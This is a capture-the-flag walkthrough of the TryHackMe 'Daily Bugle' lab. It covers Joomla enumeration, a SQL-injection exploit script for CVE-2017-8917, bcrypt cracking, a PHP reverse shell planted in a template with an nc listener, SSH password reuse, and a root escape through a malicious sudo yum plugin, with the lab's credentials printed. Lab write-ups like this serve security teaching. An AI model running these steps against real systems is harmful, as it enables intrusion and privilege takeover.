# Daily Bugle Writeup

So today I'm gonna show you how I solved the Daily Bugle room.

We start with scanning the target:

```bash
nmap -sS -sV -sC -Pn -p- -T4 -oN scan.txt 10.49.146.144
```

```bash 
# Nmap 7.95 scan initiated Fri May 15 23:30:14 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -Pn -p- -sS -T4 -oN dailybuglescan 10.49.154.69
Nmap scan report for 10.49.154.69
Host is up (0.20s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 15 23:37:56 2026 -- 1 IP address (1 host up) scanned in 461.81 seconds``` 
```

We got two open ports, HTTP on 80 and MySQL on 3306. The nmap output also tells us there's a `robots.txt` with 15 disallowed entries, which is basically a free map of sensitive directories the site is trying to hide from search engines. Thing is, `robots.txt` only tells bots not to visit those paths, it does nothing to stop us from visiting them manually.

We also notice nmap detected Joomla on port 80. Port 3306 says unauthorized, meaning we can't connect to the database directly from outside, we'll have to find another way in.

We run an extra nmap scan specifically targeting web vulnerabilities on port 80:


```
 nmap --script http-vuln* -p 80 -T4 10.49.146.144```
```


Then we move to web enumeration. Since we know it's a CMS, we use CMSeeK, a tool that detects which CMS a site is running and maps out useful information:

```bash
git clone https://github.com/Tuhinshubhra/CMSeeK.git
cd CMSeeK
pip3 install -r requirements.txt --break-system-packages
python3 cmseek.py -u http://10.49.146.144
```

CMSeeK confirms it's Joomla and gives us a bunch of useful paths including `/README.txt` and the admin panel at `/administrator`. It couldn't find the exact version though, so we try the README file in the browser first:

```
http://10.49.146.144/README.txt
```

We also check the Joomla XML manifest file which contains version info:

```
http://10.49.146.144/administrator/manifests/files/joomla.xml
```

To be thorough we also run JoomScan, a Joomla-specific scanner that knows exactly where to look:

```bash
git clone https://github.com/OWASP/joomscan.git
cd joomscan
perl joomscan.pl -u http://10.49.146.144
```

Between all three methods we confirm the version is **Joomla 3.7.0**. Now we search for known exploits:

```bash
searchsploit joomla 3.7.0
```

```
Joomla! 3.7.0 - 'com_fields' SQL Injection | php/webapps/42033.txt
```

We find a SQL Injection vulnerability, **CVE-2017-8917**. Instead of using SQLMap, there's a Python script called Joomblah that automates the whole thing. We grab it and run it:

```bash
wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py
python2 joomblah.py http://10.49.146.144
```

Note we're running it with `python2` not `python3`, the script was written for Python 2 and throws errors on Python 3. The script fetches a CSRF token first (a secret handshake the site requires), then exploits the SQLi to dump the users table.

We get:

```
Found user: jonah | jonah@tryhackme.com | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
```

We save the hash to a file and crack it with John:

```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jon.hash
john jon.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

We get `jonah / spiderman123`. We log into the Joomla admin panel at:

```
http://10.49.146.144/administrator/
```

Once inside we go to Extensions -> Templates -> Templates -> Beez3. This gives us access to the template PHP files which we can edit directly in the browser. We grab the PHP reverse shell from Kali:

```bash
cat /usr/share/webshells/php/php-reverse-shell.php
```

We update the IP and port to match our Kali machine, paste the whole thing into `component.php` and save it. We start our listener:

```bash
nc -lvnp 7777
```

Then trigger the shell by visiting the template file in the browser:

```
http://10.49.146.144/templates/beez3/component.php
```

We catch a shell as `apache`. We stabilize it:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

We used `python` instead of `python3` because this is a CentOS machine and python3 wasn't available. Now we start looking around. The Joomla config file at `/var/www/html/configuration.php` is always worth checking, it contains database credentials:

```bash
cat /var/www/html/configuration.php | grep password
```

We find:

```
$user = 'root'
$password = 'nv5uz9r3ZEDzVjNu'
```

This is the MySQL root password, but developers often reuse passwords across accounts. We check what users exist on the machine:

```bash
ls /home
```

We find a user called `jjameson`. We try the database password for their SSH account from our Kali machine:

```bash
ssh jjameson@10.49.146.144
```

Password: `nv5uz9r3ZEDzVjNu` and it works. Classic password reuse. We grab the user flag from `user.txt`.

Now we go for root. First thing we always check is sudo rights:

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/yum
```

jjameson can run `yum` as root with no password. Yum is the package manager for CentOS, like `apt` for Kali. The trick here is that yum supports custom plugins, and if we create a malicious plugin that spawns a shell, yum will run it as root since that's the context we're calling it in.

We create three files, a yum config pointing to our fake plugin, a plugin config, and the actual malicious plugin:

```bash
cat >/tmp/x<<EOF
[main]
plugins=1
pluginpath=/tmp/
pluginconfpath=/tmp/
EOF

cat >/tmp/y.conf<<EOF
[main]
enabled=1
EOF

cat >/tmp/y.py<<EOF
import yum, os
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','sh','-i')
EOF

sudo yum -c /tmp/x --enableplugin=y
```

We run it and drop straight into a root shell. We grab the final flag from `/root/root.txt`. 























# References 
